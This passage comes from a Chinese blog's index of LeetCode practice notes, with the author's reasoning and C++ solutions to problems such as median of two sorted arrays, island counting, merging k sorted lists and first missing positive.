1：**\n\n![img](2023-8-18%E4%BB%8A%E6%97%A5%E7%BB%83%E4%B9%A0/mat.jpg)\n\n```\n输入：matrix = [[1,3,5,7],[10,11,16,20],[23,30,34,60]], target = 3\n输出：true\n```\n\n### 思路（两种思路）\n\n#### 思路一：暴力遍历\n\n直接一个元素一个元素比较\n\n#### 代码一\n\n```c++\nclass Solution {\npublic:\n    bool searchMatrix(vector<vector<int>>& matrix, int target) {\n        for(auto its:matrix){\n            for(int it : its){\n                if(target==it)return true;\n            }\n        }\n        return false;\n    }\n};\n```\n\n#### 思路二：两次二分\n\n进行行和列的二分查找\n\n#### 代码二\n\n```c++\nclass Solution {\npublic:\n    bool searchMatrix(vector<vector<int>> matrix, int target) {\n        auto row = upper_bound(matrix.begin(), matrix.end(), target, [](const int b, const vector<int> &a) {\n            return b < a[0];\n        });\n        if (row == matrix.begin()) {\n            return false;\n        }\n        --row;\n        return binary_search(row->begin(), row->end(), target);\n    }\n};\n```\n\n## 回文链表（简单）\n\n### 题目描述\n\n给你一个单链表的头节点 `head` ，请你判断该链表是否为回文链表。如果是，返回 `true` ；否则，返回 `false` 。\n\n### 思路（两种思路）\n\n#### 思路一：借助栈\n\n首先在栈中存一半，另一半进栈是直接对比即可，相同就出栈，不同就说明不是回文链表\n\n#### 代码一\n\n```c++\nclass Solution {\npublic:\n    bool isPalindrome(ListNode* head) {\n        int length=0;\n        stack<int>stk;\n        ListNode*copy=head;\n        while(copy){\n            copy=copy->next;\n            length++;\n        }\n        copy=head;\n        int half_length=length%2;\n        length/=2;\n        while(length--){\n            stk.push(copy->val);\n            copy=copy->next;\n        }\n        if(half_length!=0)copy=copy->next;\n        int top=0;\n        while(copy){\n            top=stk.top();\n            if(top!=copy->val)return false;\n            stk.pop();\n            copy=copy->next;\n        }\n        return true;\n    }\n};\n```\n\n#### 思路二：反转一半\n\n首先获取链表长度，然后反转后一半，我们可以确定的是对于回文链表另一半反转之后应该和前一半一样（有可能多一个元素，不过前面的值肯定是相同的）\n\n#### 代码二\n\n```c++\nclass Solution {\npublic:\n    ListNode* revearse(ListNode*copy){\n        ListNode *s=NULL;\n        ListNode *p=copy;\n        ListNode *q;\n        while(p){\n            q=p->next;\n            p->next=s;\n            s=p;\n            p=q;\n        }\n        return s;\n    }\n    bool isPalindrome(ListNode* head) {\n        int length=0;\n        ListNode*copy=head;\n        while(copy){\n            copy=copy->next;\n            length++;\n        }\n        copy=head;\n        length/=2;\n        while(length--){\n            copy=copy->next;\n        }\n        copy=revearse(copy);\n        while(copy&&head){\n            if(copy->val!=head->val)return false;\n            copy=copy->next;\n            head=head->next;\n        }\n        return true;\n    }\n};\n```\n\n## 寻找两个正序数组的中位数（困难）\n\n### 题目描述\n\n给定两个大小分别为 `m` 和 `n` 的正序（从小到大）数组 `nums1` 和 `nums2`。请你找出并返回这两个正序数组的 **中位数** 。\n\n算法的时间复杂度应该为 `O(log (m+n))` 。\n\n### 思路\n\n借鉴了大佬的思路，整体想法是找第k小的位置，比如数组一有n个数，数组二有m个数，如果要找第k小的数，那么这个比k小的数前面就会有k-1个比它小的数，这k-1个数肯定存在于两个数组中，由于两个数组都是增序，如果两个数组比k小的数相等，那么都是k-1/2，如果不相等，肯定有个数组比k小的数小于了k-1/2，这就会导致该数组k-1/2位置的数会比第k小的数字大，同时也可以确认，另一个数组比k小的数大于了k-1/2，那么就会导致k-1/2位置的数肯定会比第k小的数字更小，就可以将该数组的该数字及之前的数字都去掉，那么我们就从找第k个数变成了找第k-((k-1)/2)小的数，因为前面的更小的都被删掉了，最后的终止条件就是找第1小的数字，直接进行比较即可\n\n**ps**：该方法有很多需要特殊考虑的地方，比如一个数组为空，数组长度不够(k-1)/2等等，需要不断调试，不断运行才能写出正确的代码，lz光提交就提交了十五次/(ㄒoㄒ)/~~\n\n### 代码\n\n```c++\nclass Solution {\npublic:\n    double findMedianSortedArrays(vector<int>& nums1, vector<int>& nums2) {\n        int length1=nums1.size();\n        int length2=nums2.size();\n        int status=(length1+length2)%2;\n        int k=(length1+length2)/2;\n        if(status)k+=1;\n        if((length1+length2)==1){\n            if(length1)return nums1[0];\n            return nums2[0];\n        }\n        int half_k;\n        while(1){\n            half_k=k/2;\n            if(nums1.size()<half_k||(half_k==0&&nums1.size()==0)){\n                if(nums1.size()>0){\n                    if(nums1[nums1.size()-1]>nums2[half_k-1]){\n                        nums2.assign(nums2.begin()+half_k,nums2.end());\n                        k-=half_k;\n                    }else{\n                        k-=nums1.size();\n                        if(status)return nums2[k-1];\n                        return double(nums2[k-1]+nums2[k])/2;\n                    }\n                }else{\n                    k-=nums1.size();\n                    if(status)return nums2[k-1];\n                    return double(nums2[k-1]+nums2[k])/2;\n                }\n                \n            }else if(nums2.size()<half_k||(half_k==0&&nums2.size()==0)){\n                if(nums2.size()>0){\n                    if(nums2[nums2.size()-1]>nums1[half_k-1]){\n                        nums1.assign(nums1.begin()+half_k,nums1.end());\n                        k-=half_k;\n                    }else{\n                        k-=nums2.size();\n                        if(status)return nums1[k-1];\n                        return double(nums1[k-1]+nums1[k])/2;\n                    }\n                }else{\n                    k-=nums2.size();\n                    if(status)return nums1[k-1];\n                    return double(nums1[k-1]+nums1[k])/2;\n                } \n            }else if(half_k!=0){\n                if(nums1[half_k-1]<nums2[half_k-1]){\n                    nums1.assign(nums1.begin()+half_k,nums1.end());\n                }else{\n                    nums2.assign(nums2.begin()+half_k,nums2.end());\n                }\n                k-=half_k; \n            }\n            if(k==1){\n                if(nums1.size()==0){\n                    if(status)return nums2[0];\n                    return double(nums2[0]+nums2[1])/2;\n                }\n                if(nums2.size()==0){\n                    if(status)return nums1[0];\n                    return double(nums1[0]+nums1[1])/2;\n                }\n                if(status)return min(nums1[0],nums2[0]);\n                if(nums1[0]==nums2[0])return double(nums1[0]);\n                if(nums1[0]<nums2[0]&&nums1.size()>=2)return double(nums1[0]+min(nums1[1],nums2[0]))/2;\n                if(nums2[0]<nums1[0]&&nums2.size()>=2)return double(nums2[0]+min(nums2[1],nums1[0]))/2;\n                return double(nums1[0]+nums2[0])/2;\n            }\n        }\n        return 0;\n    }\n};\n```\n\n## 寻找重复数（中等）(待做)\n\n### 题目描述\n\n给定一个包含 `n + 1` 个整数的数组 `nums` ，其数字都在 `[1, n]` 范围内（包括 `1` 和 `n`），可知至少存在一个重复的整数。\n\n假设 `nums` 只有 **一个重复的整数** ，返回 **这个重复的数** 。\n\n你设计的解决方案必须 **不修改** 数组 `nums` 且只用常量级 `O(1)` 的额外空间。\n\n### 思路\n\n## 颜色分类（中等）\n\n### 题目描述\n\n给定一个包含红色、白色和蓝色、共 `n` 个元素的数组 `nums` ，**[原地](https://baike.baidu.com/item/原地算法)**对它们进行排序，使得相同颜色的元素相邻，并按照红色、白色、蓝色顺序排列。\n\n我们使用整数 `0`、 `1` 和 `2` 分别表示红色、白色和蓝色。\n\n必须在不使用库内置的 sort 函数的情况下解决这个问题。\n\n### 思路\n\n看起来代码比较复杂但是只遍历了一次数组，不知道能不能缩减，希望大佬能帮我看看，总体思路是：\n\n由于题目确定了只有三个数字，所以我选择用双指针i和j，从头和尾往中间走，im表示im之前已经排好0的位置，jm表示jm之后已经排好2的位置，如果i和j遇到了0或者2，就放到im后一个位置或者jm前一个位置，知道遍历到i==j就说明遍历完了\n\n就相当于把0往前扔，把2往后扔，1不变\n\n### 代码\n\n```c++\nclass Solution {\npublic:\n    void sortColors(vector<int>& nums) {\n        int length=nums.size();\n        int i,j;\n        int im=-1;\n        int jm=length;\n        while(im<length-1&&nums[im+1]==0)im++;\n        i=im+1;\n        while(i<length&&nums[i]==1)i++;\n        while(jm>=1&&nums[jm-1]==2)jm--;\n        j=jm-1;\n        while(j>=0&&nums[j]==1)j--;\n        while(i<length&&j>=0&&i<=j){\n            if(nums[i]==2&&nums[j]==0){\n                if(j==jm-1&&i!=im+1){\n                    swap(nums[j--],nums[++im]);\n                    swap(nums[i++],nums[--jm]);\n                }else if(j==jm-1&&i==im+1){\n                    swap(nums[j--],nums[i++]);\n                    ++im;\n                    --jm;\n                }else{\n                    swap(nums[i++],nums[--jm]);\n                    swap(nums[j--],nums[++im]);\n                }  \n            }else if(nums[i]==0&&nums[j]==0){\n                swap(nums[i++],nums[++im]);\n                swap(nums[++im],nums[j--]);\n                if(im==i)i++;\n            }else if(nums[i]==0&&nums[j]==2){\n                swap(nums[i++],nums[++im]);\n                swap(nums[j--],nums[--jm]);\n            }else if(nums[i]==2&&nums[j]==2){\n                swap(nums[i++],nums[--jm]);\n                swap(nums[j--],nums[--jm]);\n                if(j==jm)j--;\n            }\n            while(im<length-1&&nums[im+1]==0)im++;\n            i=im+1;\n            while(i<length&&nums[i]==1)i++;\n            while(jm>=1&&nums[jm-1]==2)jm--;\n            j=jm-1;\n            while(j>=0&&nums[j]==1)j--;\n        }\n    }\n};\n```\n\n## 二叉树的中序遍历（简单）\n\n### 题目描述\n\n给定一个二叉树的根节点 `root` ，返回 *它的 **中序** 遍历* 。\n\n### 思路\n\n规规矩矩中序遍历即可，很简单\n\n### 代码\n\n```c++\nclass Solution {\npublic:\n    vector<int>ans;\n    void mid(TreeNode* root){\n        if(root==NULL)return;\n        mid(root->left);\n        ans.push_back(root->val);\n        mid(root->right);\n    }\n    vector<int> inorderTraversal(TreeNode* root) {\n        mid(root);\n        return ans;\n    }\n};\n```\n\n## 搜索旋转排序数组（中等）\n\n### 题目描述\n\n整数数组 `nums` 按升序排列，数组中的值 **互不相同** 。\n\n在传递给函数之前，`nums` 在预先未知的某个下标 `k`（`0 <= k < nums.length`）上进行了 **旋转**，使数组变为 `[nums[k], nums[k+1], ..., nums[n-1], nums[0], nums[1], ..., nums[k-1]]`（下标 **从 0 开始** 计数）。例如， `[0,1,2,4,5,6,7]` 在下标 `3` 处经旋转后可能变为 `[4,5,6,7,0,1,2]` 。\n\n给你 **旋转后** 的数组 `nums` 和一个整数 `target` ，如果 `nums` 中存在这个目标值 `target` ，则返回它的下标，否则返回 `-1` 。\n\n你必须设计一个时间复杂度为 `O(log n)` 的算法解决此问题。\n\n**示例 1：**\n\n```\n输入：nums = [4,5,6,7,0,1,2], target = 0\n输出：4\n```\n\n### 知识点\n\n1. c++合并数组（vector）\n\n   ```c++\n       vector<int> vec1 = {...};\n       vector<int> vec2 = {...};// vec1和vec2都存有内容\n    \n       vector<int> vec3;//vec3是空的\n       vec3.insert(vec3.end(),vec1.begin(),vec1.end())//将vec1压入\n       vec3.insert(vec3.end(),vec2.begin(),vec2.end())//继续将vec2压入\n   ```\n\n### 思路\n\n由题得，如果数组预先进行了旋转，那么数组可以分为升序的两部分，可以用二分法找到第二个升序的起始点，也就是找到第一个小于nums[0]的点，然后确定target属于哪个区间，在区间再进行二分查找即可\n\n### 代码\n\n```c++\nclass Solution {\npublic:\n    int search(vector<int>& nums, int target) {\n        int left=0;\n        int right=nums.size()-1;\n        int mid;\n        if(nums[right]<nums[left]){\n            while(left<right-1){\n                mid=(left+right)/2;\n                if(nums[mid]>=nums[left])left=mid;\n                else right=mid;\n            }\n            if(nums[right]>target)return -1;\n            if(nums[0]>target){\n                left=right;\n                right=nums.size()-1;\n            }else{\n                left=0;\n                right=right-1;\n            }\n        }\n        while(left<right-1){\n            mid=(left+right)/2;\n            if(nums[mid]<=target)left=mid;\n            else right=mid;\n        }\n        if(nums[left]!=target&&nums[right]!=target)return -1;\n        return nums[left]==target?left:right;\n    }\n};\n```\n\n## 合并区间（中等）\n\n### 题目描述\n\n以数组 `intervals` 表示若干个区间的集合，其中单个区间为 `intervals[i] = [starti, endi]` 。请你合并所有重叠的区间，并返回 *一个不重叠的区间数组，该数组需恰好覆盖输入中的所有区间* 。\n\n### 知识点\n\n1. 优先队列+pair小根堆\n\n   ```c++\n   priority_queue<pair<int,int>,vector<pair<int,int>>,greater<pair<int,int>>>pq;\n   ```\n\n### 思路\n\n使用优先队列+pair自动排序，然后一个一个取出来比较就可以了（但是好像直接sort就行）\n\n### 代码\n\n```c++\nclass Solution {\npublic:\n    vector<vector<int>> merge(vector<vector<int>>& intervals) {\n        priority_queue<pair<int,int>,vector<pair<int,int>>,greater<pair<int,int>>>nums;\n        for(auto it : intervals){\n            nums.emplace(it[0],it[1]);\n        }\n        vector<vector<int>>ans;\n        int first,second;\n        first=nums.top().first;\n        second=nums.top().second;\n        nums.pop();\n        while(!nums.empty()){\n            if(nums.top().first>second){\n                ans.push_back({first,second});\n                first=nums.top().first;\n                second=nums.top().second;\n            }else{\n                second=max(second,nums.top().second);\n            }\n            nums.pop();\n        }\n        ans.push_back({first,second});\n        return ans;\n    }\n};\n```\n\n## 岛屿数量（中等）\n\n### 题目描述\n\n给你一个由 `'1'`（陆地）和 `'0'`（水）组成的的二维网格，请你计算网格中岛屿的数量。\n\n岛屿总是被水包围，并且每座岛屿只能由水平方向和/或竖直方向上相邻的陆地连接形成。\n\n此外，你可以假设该网格的四条边均被水包围。\n\n**示例 1：**\n\n```\n输入：grid = [\n  [\"1\",\"1\",\"1\",\"1\",\"0\"],\n  [\"1\",\"1\",\"0\",\"1\",\"0\"],\n  [\"1\",\"1\",\"0\",\"0\",\"0\"],\n  [\"0\",\"0\",\"0\",\"0\",\"0\"]\n]\n输出：1\n```\n\n**示例 2：**\n\n```\n输入：grid = [\n  [\"1\",\"1\",\"0\",\"0\",\"0\"],\n  [\"1\",\"1\",\"0\",\"0\",\"0\"],\n  [\"0\",\"0\",\"1\",\"0\",\"0\"],\n  [\"0\",\"0\",\"0\",\"1\",\"1\"]\n]\n输出：3\n```\n\n### 思路\n\n**二维数组的dfs遍历**\n\n和二叉树相似，二叉树前序遍历思路是先遍历左节点，再遍历右节点，二维矩阵的遍历是先遍历左边，然后上面，右面，下面，这样遍历的结果肯定是属于一个岛的，遍历四个方向即可，同时由于不同点可能会遍历到同一个地方，将遍历过的地方进行标记，以免重复，此题的思路就是先遍历到第一个等于1的点，然后从四个方向进行遍历，将遍历的点都标记为2，这样下次遍历就不会再遍历到该点，有点像**消消乐**，从一个点往周围延申，全部遍历到并消除\n\n### 代码\n\n```c++\nclass Solution {\npublic:\n    void dfs(vector<vector<char>>&grid,int i,int j){\n        if(i>=grid.size()||j>=grid[0].size()||i<0||j<0||grid[i][j]!='1')return;\n        grid[i][j]='2';\n        dfs(grid,i-1,j);\n        dfs(grid,i+1,j);\n        dfs(grid,i,j+1);\n        dfs(grid,i,j-1);\n    }\n    int numIslands(vector<vector<char>>& grid) {\n        int gridnum=0;\n        for(int i=0;i<grid.size();i++){\n            for(int j=0;j<grid[0].size();j++){\n                if(grid[i][j]=='1'){\n                    gridnum++;\n                    dfs(grid,i,j);\n                }\n            }\n        }\n        return gridnum;\n    }\n};\n```\n\n## 二叉树的层序遍历（中等）\n\n### 题目描述\n\n给你二叉树的根节点 `root` ，返回其节点值的 **层序遍历** 。 （即逐层地，从左到右访问所有节点）。\n\n**示例 1：**\n\n![img](2023-8-18%E4%BB%8A%E6%97%A5%E7%BB%83%E4%B9%A0/tree1.jpg)\n\n```\n输入：root = [3,9,20,null,null,15,7]\n输出：[[3],[9,20],[15,7]]\n```\n\n### 知识点\n\n1. c++ vector基本用法\n\n   ```\n   queue 和 stack 有一些成员函数相似，但在一些情况下，工作方式有些不同：\n   front()：返回 queue 中第一个元素的引用。如果 queue 是常量，就返回一个常引用；如果 queue 为空，返回值是未定义的。\n   back()：返回 queue 中最后一个元素的引用。如果 queue 是常量，就返回一个常引用；如果 queue 为空，返回值是未定义的。\n   push(const T& obj)：在 queue 的尾部添加一个元素的副本。这是通过调用底层容器的成员函数 push_back() 来完成的。\n   push(T&& obj)：以移动的方式在 queue 的尾部添加元素。这是通过调用底层容器的具有右值引用参数的成员函数 push_back() 来完成的。\n   pop()：删除 queue 中的第一个元素。\n   size()：返回 queue 中元素的个数。\n   empty()：如果 queue 中没有元素的话，返回 true。\n   emplace()：用传给 emplace() 的参数调用 T 的构造函数，在 queue 的尾部生成对象。\n   swap(queue<T> &other_q)：将当前 queue 中的元素和参数 queue 中的元素交换。它们需要包含相同类型的元素。也可以调用全局函数模板 swap() 来完成同样的操作。\n   ```\n\n### 思路\n\n比较简单，用队列，先进后出原则，先将root存进队列，这个时候相当于第一层，所以只遍历root一个点即可，先获取当前队列长度为1，即当前遍历次数，然后存进left和right，再将root给pop掉，接着继续遍历第二层，也就是上一层存进的left和right，**直接获取队列长度作为遍历次数即可**\n\n### 代码\n\n```c++\n/**\n * Definition for a binary tree node.\n * struct TreeNode {\n *     int val;\n *     TreeNode *left;\n *     TreeNode *right;\n *     TreeNode() : val(0), left(nullptr), right(nullptr) {}\n *     TreeNode(int x) : val(x), left(nullptr), right(nullptr) {}\n *     TreeNode(int x, TreeNode *left, TreeNode *right) : val(x), left(left), right(right) {}\n * };\n */\nclass Solution {\npublic:\n    vector<vector<int>> levelOrder(TreeNode* root) {\n        queue<TreeNode*>node;\n        vector<vector<int>>ans;\n        vector<int>tempans;\n        node.push(root);\n        int length;\n        while(!node.empty()){\n            length=node.size();\n            while(length--){\n                if(node.front()){\n                    tempans.push_back(node.front()->val);\n                    node.push(node.front()->left);\n                    node.push(node.front()->right);\n                }\n                node.pop();\n            }\n            if(!tempans.empty())ans.push_back(tempans);\n            tempans.clear();\n        }\n        return ans;\n    }\n};\n```\n\n## 对称二叉树（简单）\n\n### 题目描述\n\n给你一个二叉树的根节点 `root` ， 检查它是否轴对称。\n\n**示例 1：**\n\n![img](2023-8-18%E4%BB%8A%E6%97%A5%E7%BB%83%E4%B9%A0/symtree1.jpg)\n\n```\n输入：root = [1,2,2,3,4,4,3]\n输出：true\n```\n\n### 思路\n\n用递归遍历即可，很好发现对称二叉树的规律，首先分为两部分，root的左节点和右节点，比较两节点值是否相等，相等就在比较root左节点的右节点和root右节点的左节点值是否相等\n\n### 代码\n\n```c++\nclass Solution {\npublic:\n    bool compare(TreeNode*Node1,TreeNode*Node2){\n        if(Node1==NULL&&Node2==NULL)return true;\n        if(Node1==NULL||Node2==NULL||Node1->val!=Node2->val)return false;\n        return compare(Node1->left,Node2->right)&&compare(Node1->right,Node2->left);\n    }\n    bool isSymmetric(TreeNode* root) {\n        return compare(root->left,root->right);\n    }\n};\n```\n\n## 最小路径和（中等）\n\n### 题目描述\n\n给定一个包含非负整数的 `*m* x *n*` 网格 `grid` ，请找出一条从左上角到右下角的路径，使得路径上的数字总和为最小。\n\n**说明：**每次只能向下或者向右移动一步。\n\n**示例 1：**\n\n![img](2023-8-18%E4%BB%8A%E6%97%A5%E7%BB%83%E4%B9%A0/minpath.jpg)\n\n```\n输入：grid = [[1,3,1],[1,5,1],[4,2,1]]\n输出：7\n解释：因为路径 1→3→1→1→1 的总和最小。\n```\n\n### 思路\n\n这个题感觉做过啊，但是leetcode没显示，那就再做一遍吧OvO\n\n`dp[i][j]`代表的是到达（i，j）位置的最短路径，等于到达(i-1,j)的最短路径和到达(i,j-1)的最短路径的较小值+`grid[i][j]`\n\n### 代码\n\n```c++\nclass Solution {\npublic:\n    int minPathSum(vector<vector<int>>& grid) {\n        vector<vector<int>>dp(grid.size()+1,vector<int>(grid[0].size()+1,0));\n        for(int i=1;i<=grid.size();i++)\n            dp[i][1]=dp[i-1][1]+grid[i-1][0];\n        for(int j=1;j<=grid[0].size();j++)\n            dp[1][j]=dp[1][j-1]+grid[0][j-1];\n        for(int i=2;i<=grid.size();i++)\n            for(int j=2;j<=grid[0].size();j++)\n                dp[i][j]=min(dp[i-1][j],dp[i][j-1])+grid[i-1][j-1];\n        return dp[grid.size()][grid[0].size()];\n    }\n};\n```\n\n## 合并K个升序链表（困难）\n\n### 题目描述\n\n给你一个链表数组，每个链表都已经按升序排列。\n\n请你将所有链表合并到一个升序链表中，返回合并后的链表。\n\n**示例 1：**\n\n```\n输入：lists = [[1,4,5],[1,3,4],[2,6]]\n输出：[1,1,2,3,4,4,5,6]\n解释：链表数组如下：\n[\n  1->4->5,\n  1->3->4,\n  2->6\n]\n将它们合并到一个有序链表中得到。\n1->1->2->3->4->4->5->6\n```\n\n### 思路\n\n合并k个有序链表也许很陌生，但是合并两个有序链表就好做很多，比如第一个示例，可以看作先合并前两个，再和最后一个合并，和二分法的思维很类似，比如现在有长度为7的lists，第一轮合并lists[0]+lists[1], lists[2]+lists[3], lists[4]+lists[5],最后添上list[6]，得到长度为4的新链表组，继续两两合并直到最后新链表组长度为1即可\n\n### 代码\n\n```c++\nclass Solution {\npublic:\n    ListNode* merge2Lists(ListNode* list1,ListNode* list2){\n        ListNode*ans=new ListNode();\n        ListNode*tempans=ans;\n        while(list1&&list2){\n            while(list2&&list1&&list1->val<=list2->val){\n                tempans->next=list1;\n                tempans=tempans->next;\n                list1=list1->next;\n            }\n            while(list1&&list2&&list2->val<list1->val){\n                tempans->next=list2;\n                tempans=tempans->next;\n                list2=list2->next;\n            }\n        }\n        if(list1){\n            tempans->next=list1;\n        }else if(list2){\n            tempans->next=list2;\n        }\n        return ans->next;\n    }\n    ListNode* mergeKLists(vector<ListNode*>& lists) {\n        if(lists.size()==0||(lists.size()==1&&lists[0]==NULL))return NULL;\n        vector<ListNode*>templists;\n        while(lists.size()!=1){\n            for(int i=0;i<lists.size()/2;i++){\n                templists.push_back(merge2Lists(lists[i*2],lists[i*2+1]));\n            }\n            if(lists.size()%2)templists.push_back(lists.back());\n            lists.assign(templists.begin(),templists.end());\n            templists.clear();\n        }\n        return lists[0];\n    }\n};\n```\n\n","tags":["c","c++"],"categories":["数据结构"]},{"title":"leetcode100题_2","url":"/post/266d9ac.html","content":"\nleetcode必做100题第二部分\n\n<!--more-->\n\n## 多数元素（简单）\n\n### 题目描述\n\n给定一个大小为 `n` 的数组 `nums` ，返回其中的多数元素。多数元素是指在数组中出现次数 **大于** `⌊ n/2 ⌋` 的元素。\n\n你可以假设数组是非空的，并且给定的数组总是存在多数元素。\n\n### 知识点\n\n1. 找到哈希的最大键值及索引\n\n   ```c++\n   //定义比较的函数\n   bool cmp_value(const pair<int, int> left,const pair<int,int> right){\n   \treturn left.second < right.second;\n   }\n    \n   int main(){\n   \tmap<int, int> test;\n   \t//初始化\n   \ttest.emplace(10, 5);\n   \ttest.emplace(3, 17);\n   \ttest.emplace(19, 20);\n   \ttest.emplace(20, 15);\n   \t//输出按序排列的key值\n   \tfor (auto it : test)\n   \t\tcout << it.first << \" \";\n   \tcout << endl;\n   \t//i是迭代器  返回值为19-20\n   \tauto i= max_element(test.begin(),test.end(),cmp_value);\n   \tcout << i->first << i->second << endl;\n   }\n   ```\n\n   \n\n### 思路（两个思路）\n\n#### 思路一\n\n用哈希，键是元素，值是元素在数组中的次数，也就是遍历一次数组，时间空间复杂度均为n\n\n#### 代码一\n\n```c++\nclass Solution {\npublic:\n    int majorityElement(vector<int>& nums) {\n        unordered_map<int,int>hash;\n        for(int i:nums){\n            hash[i]++;\n        }\n        auto i = max_element(hash.begin(), hash.end(), [](const auto& p1, const auto& p2){\n       return p1.second < p2.second;\n   });\n        return i->first;\n    }\n};\n```\n\n#### 思路二：Boyer-Moore 投票算法\n\n我在这里对这个算法有一个另外的解释，比如在一个数组中，7是这个数组中的众数，现在我们随机删除两个不同的数，最后留下来的肯定就都是众数，考虑两种极端情况，只删除不是众数的值，很显然符合，如果都删除是众数的值，但是众数的值已经超过了一半，而且我们考虑的是删除两个不同的值，所以就算其他值删完了，众数还存在\n\n代码删除值的方式为记录一个值出现的次数，遇到相同的次数加一，遇到不同的减一，最后变为0就相当于删除了和它同等数量的不同的值，再进行新一轮，记录新的值出现的次数，最后剩下的肯定是众数\n\n#### 代码二\n\n```c++\nclass Solution {\npublic:\n    int majorityElement(vector<int>& nums) {\n        int candidate=nums[0];\n        int count=0;\n        for(int number:nums){\n            if(candidate==number){\n                count++;\n            }else{\n                if(count>0){\n                    count--;\n                }else{\n                    candidate=number;\n                    count=1;\n                }\n            }\n        }\n        return candidate;\n    }\n};\n```\n\n## 轮转数组（中等）\n\n### 题目描述\n\n给定一个整数数组 `nums`，将数组中的元素向右轮转 `k` 个位置，其中 `k` 是非负数。\n\n### 思路\n\n#### 思路一\n\n最简单的思路，将数组复制，再移动\n\n时间复杂度为O(n)，空间复杂度为O(n)\n\n#### 代码一\n\n```c++\nclass Solution {\npublic:\n    void rotate(vector<int>& nums, int k) {\n        vector<int> numcopy(nums.begin(),nums.end());\n        int length=nums.size();\n        for(int i=0;i<length;i++){\n            nums[(i+k)%length]=numcopy[i];\n        }\n    }\n};\n```\n\n#### 思路二\n\n绞尽脑汁想出来的哈哈哈\n\n大概思路是选一个点进行移动，移动到最后肯定会返回值到最初的那个点，然后记录下移动过的数离自己最近的点，下次移动就移动这一个区间就可以了，移动的思路就是tempo2记录i位置的值，tempo1记录i+k位置的值，i+k换成tempo2，tempo2更新为tempo1，直到最后要更新的位置是起始点\n\n时间复杂度为O(n)，空间复杂度为O(1)\n\n#### 代码二\n\n```c++\nclass Solution {\npublic:\n    void rotate(vector<int>& nums, int k) {\n        int length=nums.size();\n        if(k==0||length==1){\n            return;\n        }\n        int tempo1;\n        int tempo2;\n        int add=k;\n        int start;\n        for(int i=0;i<add;i++){\n            start=i;\n            tempo2=nums[i];\n            while((start+k)%length!=i){\n                add=min(add,(start+k)%length);\n                tempo1=nums[(start+k)%length];\n                nums[(start+k)%length]=tempo2;\n                tempo2=tempo1;\n                start+=k;\n            }\n            nums[i]=tempo2;\n        }\n    }\n};\n```\n\n## 除自身以外数组的乘积（中等）\n\n### 题目描述\n\n给你一个整数数组 `nums`，返回 *数组 `answer` ，其中 `answer[i]` 等于 `nums` 中除 `nums[i]` 之外其余各元素的乘积* 。\n\n题目数据 **保证** 数组 `nums`之中任意元素的全部前缀元素和后缀的乘积都在 **32 位** 整数范围内。\n\n请**不要使用除法，**且在 `O(*n*)` 时间复杂度内完成此题。\n\n### 思路\n\n由于规定了时间复杂度，所以我们得知只能遍历能计算数量次数的数组\n\n先说说lz最开始的思路：用两个数组，用遍历一次分别存储前i位和后i位的乘积，再遍历到最后算某个数的时候，就用前后相乘就可以了，总共两次遍历，大概如下方代码所示：\n\n```c++\nans.push_back(begin[i-1]*end[length-2-i]);\n```\n\n但是这样时间和内存只打败了不到百分之十的人，于是lz再次思考，两次循环肯定不能省，因为对于某一个元素的前面的乘积和后面的乘积没办法一次算完，应该从内存上下手，可以看到我定义了三个数组，结果ans数组可以不管，begin和end应该是可以省掉的，在计算begin的时候，我是通过从前往后遍历数组，然后算前面的累计乘积，这个顺序和最后算ans的顺序是一样的，所以可以把begin的计算过程放在后面，也就是遍历得到ans的时候，顺便算begin，代码如下：\n\n```c++\nbegin*=nums[i-1];//begin累计乘\nans.push_back(begin*end[length-2-i]);\n```\n\n这样的时间复杂度确实下降了，但是不够理想，再次思考能不能把end去了，既然begin可以用累计的方式计算，不用存每一次计算的结果，计算之后就直接用，那end应该也可以！我们知道end是从后往前遍历的，那就让我们的ans再从后往前遍历，乘上end，让end每次都有用，代码如下：\n\n```c++\nend*=nums[i+1];\nans[i]*=end;\n```\n\n最后的时间和空间效果都比较理想\n\n### 代码\n\n```c++\nclass Solution {\npublic:\n    vector<int> productExceptSelf(vector<int>& nums) {\n        int begin=1;\n        int end=1;\n        int length=nums.size();\n        vector<int>ans(length,1);\n        for(int i=0;i<length;i++){\n            if(i==0){\n                ans[i]=1;\n            }else{\n                begin*=nums[i-1];\n                ans[i]=begin;\n            }\n        }\n        for(int i=length-2;i>=0;i--){\n            end*=nums[i+1];\n            ans[i]*=end;\n        }\n        return ans;\n    }\n};\n```\n\n## 缺失的第一个正数（困难）\n\n### 题目描述\n\n给你一个未排序的整数数组 `nums` ，请你找出其中没有出现的最小的正整数。\n\n请你实现时间复杂度为 `O(n)` 并且只使用常数级别额外空间的解决方案。\n\n### 思路（两种思路）\n\n#### 思路一\n\nby myself\n\n1. 排序\n2. 去重\n3. 找缺失值\n\n**这种方法时间复杂度不合要求**\n\n#### 代码一\n\n```c++\nclass Solution {\npublic:\n    int firstMissingPositive(vector<int>& nums) {\n        int first=0;\n        sort(nums.begin(),nums.end());\n        nums.erase(unique(nums.begin(),nums.end()),nums.end());\n        int length=nums.size();\n        for(int i=0;i<length;i++){\n            if(nums[i]>0){\n                if(first==0){\n                    if(nums[i]!=1){\n                        return 1;\n                    }\n                    first=1;\n                }\n                if(nums[i]!=1&&nums[i]!=nums[i-1]+1){\n                    return nums[i-1]+1;\n                }\n            }\n        }\n        if(nums[length-1]+1<=0){\n            return 1;\n        }\n        return nums[length-1]+1;\n    }\n};\n```\n\n#### 思路二\n\n将原数组进行排序，我们可以根据题目得到，最后要得到的那个数前面的数一定都是排序好了的，所以，可以在原数组上进行排序，但是为了不缺失数据，排序的方式是：将下标作为排序的排名，当然肯定会有些值无法找到对应地点，这种值也不用管，我们只能确认我们要求的那个值前面的值一定都是排序好了的，找到第一个不能正确排序的位置就行了，大概步骤如下：\n\n1. 遍历数组，将数组中的值和应该存放的地方进行交换，比如0存的是3，2存的是4，3存的是1（我们是为了找到正数，所以排序就让0存1，1存2）\n2. 首先0存的值不是1，把3和下标为3-1=2的位置的值进行交换，0存的就变成4，也不规范，就和4-1=3的下标的值进行交换，最后0存的就变成1了，以此类推\n\n#### 代码二\n\n```c++\nclass Solution {\npublic:\n    int firstMissingPositive(vector<int>& nums) {\n        int length=nums.size();\n        for(int i=0;i<length;i++){\n                while(nums[i]>0&&nums[i]!=i+1&&nums[i]<length&&nums[i]!=nums[nums[i]-1]){\n                    swap(nums[i],nums[nums[i]-1]);\n                }\n            \n        }\n        for(int i=0;i<length;i++){\n            if(nums[i]!=i+1){\n                return i+1;\n            }\n        }\n        return nums[length-1]+1;\n    }\n};\n```\n\n## 二叉树展开为链表(中等)\n\n### 题目描述\n\n给你二叉树的根结点 